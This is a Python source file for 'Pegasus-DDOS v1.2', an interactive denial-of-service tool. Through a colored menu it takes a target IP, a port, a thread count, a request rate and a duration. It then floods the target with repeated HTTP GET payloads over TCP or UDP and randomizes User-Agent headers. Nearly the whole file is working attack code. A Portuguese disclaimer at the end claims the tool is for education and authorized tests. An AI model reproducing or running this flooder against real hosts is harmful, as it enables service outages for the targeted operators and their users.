import socket
import threading
import sys
import time
import random
import re

# Cores
YELLOW_BRIGHT = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

# User-Agents para randomização
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)"
]

stop_attack = threading.Event()
packets_sent = 0

def is_valid_ip(ip):
    # Regex para IPv4
    pattern = re.compile(
        r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    )
    return pattern.match(ip) is not None

def spinner_anim(text, duration):
    spinner = ['|', '/', '-', '\\']
    end_time = time.time() + duration
    idx = 0
    while time.time() < end_time and not stop_attack.is_set():
        print(f"\r{MAGENTA}{text} {spinner[idx % len(spinner)]}{RESET}", end='', flush=True)
        time.sleep(0.1)
        idx += 1
    print('\r', end='')

def attack_tcp(target_ip, target_port, turbo, duration, quiet):
    global packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target_ip, target_port))
        message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode('utf-8')
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack.is_set():
            for _ in range(turbo):
                sock.send(message)
                packets_sent += 1
        if not quiet:
            print(f"{MAGENTA}TCP attack sent to {target_ip}:{target_port}{RESET}")
    except Exception as e:
        if not quiet:
            print(f"{MAGENTA}Failed to attack {target_ip}:{target_port} — {e}{RESET}")
    finally:
        if 'sock' in locals():
            sock.close()

def attack_udp(target_ip, target_port, turbo, duration, quiet):
    global packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode('utf-8')
        end_time = time.time() + duration
        while time.time() < end_time and not stop_attack.is_set():
            for _ in range(turbo):
                sock.sendto(message, (target_ip, target_port))
                packets_sent += 1
        if not quiet:
            print(f"{MAGENTA}UDP attack sent to {target_ip}:{target_port}{RESET}")
    except Exception as e:
        if not quiet:
            print(f"{MAGENTA}Failed to attack {target_ip}:{target_port} — {e}{RESET}")
    finally:
        if 'sock' in locals():
            sock.close()

def main_menu():
    global packets_sent
    target_ip = ""
    target_port = 80
    turbo = 135
    threads_num = 10
    duration = 10  # segundos
    quiet = False
    proto = "TCP"
    MAX_THREADS = 100
    MAX_TURBO = 1000
    running_threads = []

    try:
        while True:
            print()
            print(f"{YELLOW_BRIGHT}--- Pegasus-DDOS Menu ---{RESET}")
            print(f"{GREEN}1.{RESET} Set target IP {CYAN}(current: {target_ip}){RESET}")
            print(f"{GREEN}2.{RESET} Set target port {CYAN}(current: {target_port}){RESET}")
            print(f"{GREEN}3.{RESET} Set turbo (requests per thread) {CYAN}(current: {turbo}){RESET}")
            print(f"{GREEN}4.{RESET} Set number of threads {CYAN}(current: {threads_num}){RESET}")
            print(f"{GREEN}5.{RESET} Set attack duration (seconds) {CYAN}(current: {duration}){RESET}")
            print(f"{GREEN}6.{RESET} Toggle quiet mode {CYAN}(current: {'ON' if quiet else 'OFF'}){RESET}")
            print(f"{GREEN}7.{RESET} Set protocol (TCP/UDP) {CYAN}(current: {proto}){RESET}")
            print(f"{GREEN}8.{RESET} Start attack")
            print(f"{GREEN}9.{RESET} Stop attack")
            print(f"{GREEN}10.{RESET} Exit")

            choice = input(f"{YELLOW_BRIGHT}Choose an option (1-10): {RESET}")

            if choice == "1":
                ip = input(f"{YELLOW_BRIGHT}Enter target IP: {RESET}").strip()
                if is_valid_ip(ip):
                    target_ip = ip
                else:
                    print(f"{MAGENTA}Invalid IP address!{RESET}")
            elif choice == "2":
                try:
                    port = int(input(f"{YELLOW_BRIGHT}Enter target port: {RESET}").strip())
                    if 1 <= port <= 65535:
                        target_port = port
                    else:
                        print(f"{MAGENTA}Port must be between 1 and 65535!{RESET}")
                except ValueError:
                    print(f"{MAGENTA}Invalid port number!{RESET}")
            elif choice == "3":
                try:
                    t = int(input(f"{YELLOW_BRIGHT}Enter turbo (requests per thread): {RESET}").strip())
                    if 1 <= t <= MAX_TURBO:
                        turbo = t
                    else:
                        print(f"{MAGENTA}Turbo should be between 1 and {MAX_TURBO}!{RESET}")
                except ValueError:
                    print(f"{MAGENTA}Invalid number!{RESET}")
            elif choice == "4":
                try:
                    th = int(input(f"{YELLOW_BRIGHT}Enter number of threads: {RESET}").strip())
                    if 1 <= th <= MAX_THREADS:
                        threads_num = th
                    else:
                        print(f"{MAGENTA}Threads should be between 1 and {MAX_THREADS}!{RESET}")
                except ValueError:
                    print(f"{MAGENTA}Invalid number!{RESET}")
            elif choice == "5":
                try:
                    d = int(input(f"{YELLOW_BRIGHT}Enter duration in seconds: {RESET}").strip())
                    if d > 0:
                        duration = d
                    else:
                        print(f"{MAGENTA}Duration must be positive!{RESET}")
                except ValueError:
                    print(f"{MAGENTA}Invalid number!{RESET}")
            elif choice == "6":
                quiet = not quiet
                print(f"{MAGENTA}Quiet mode set to {'ON' if quiet else 'OFF'}.{RESET}")
            elif choice == "7":
                pr = input(f"{YELLOW_BRIGHT}Protocol (TCP/UDP): {RESET}").strip().upper()
                if pr in ("TCP", "UDP"):
                    proto = pr
                else:
                    print(f"{MAGENTA}Protocol must be TCP or UDP!{RESET}")
            elif choice == "8":
                if target_ip == "":
                    print(f"{MAGENTA}Target IP is not set!{RESET}")
                    continue

                stop_attack.clear()
                packets_sent = 0
                print(f"{MAGENTA}Starting {proto} attack on {target_ip}:{target_port} with turbo {turbo}, {threads_num} threads for {duration} seconds...{RESET}")
                running_threads = []

                # Animação de ataque
                spinner_thread = threading.Thread(target=spinner_anim, args=("Attacking", duration), daemon=True)
                spinner_thread.start()

                for _ in range(threads_num):
                    if proto == "TCP":
                        t = threading.Thread(target=attack_tcp, args=(target_ip, target_port, turbo, duration, quiet), daemon=True)
                    else:
                        t = threading.Thread(target=attack_udp, args=(target_ip, target_port, turbo, duration, quiet), daemon=True)
                    t.start()
                    running_threads.append(t)

                # Espera pelo fim do ataque ou parada manual
                start_time = time.time()
                while time.time() - start_time < duration and not stop_attack.is_set():
                    time.sleep(0.1)

                stop_attack.set()
                for t in running_threads:
                    t.join()
                spinner_thread.join()

                print(f"{MAGENTA}\nAttack completed! Total packets sent: {packets_sent}{RESET}")
            elif choice == "9":
                if running_threads:
                    stop_attack.set()
                    print(f"{MAGENTA}Attack stopped by user!{RESET}")
                    for t in running_threads:
                        t.join()
                else:
                    print(f"{MAGENTA}No attack running.{RESET}")
            elif choice == "10":
                print(f"{MAGENTA}Exiting.{RESET}")
                sys.exit()
            else:
                print(f"{MAGENTA}Invalid option. Try again.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{MAGENTA}Program interrupted by user. Exiting.{RESET}")

if __name__ == "__main__":
    print("\033[31m" + r"""
                     
 .                                                      .
      .n                     .             .                n.
  . .dP                   dP               9b               9b   .
 4  qXb         .        dX                 Xb       .      dXp   t
dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP
 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP
   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP
     9XXXXXP   9XX      *     98v8P      *     XXP   9XXXXXXXP
      ~~~       9X.          .db|db.          .XP       ~~~
                  )b.  .dbo.dP' v  9b.odb.  .dX(
                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb
              dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
              9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP
                       9XXXXXX(   )XXXXXXP
                       XXXX X. v .X XXXX
                        XP^X' b   d' X^XX
                        X. 9         P )X
                         b          '  d'
""" + "\033[0m")
    print(f"{GREEN}  PEGASUS-DDOS! v1.2{RESET}")
    main_menu()

    # AVISO LEGAL⚠️
    print(f"""\n{YELLOW_BRIGHT}AVISO LEGAL:{RESET}
{MAGENTA}Este script é destinado apenas para fins educacionais e testes autorizados em ambientes controlados.
O uso para atacar sistemas sem permissão é ilegal e pode resultar em sanções civis e criminais.
Use sempre sob autorização explícita do proprietário do sistema alvo.
O desenvolvedor não se responsabiliza por qualquer uso indevido.{RESET}
""")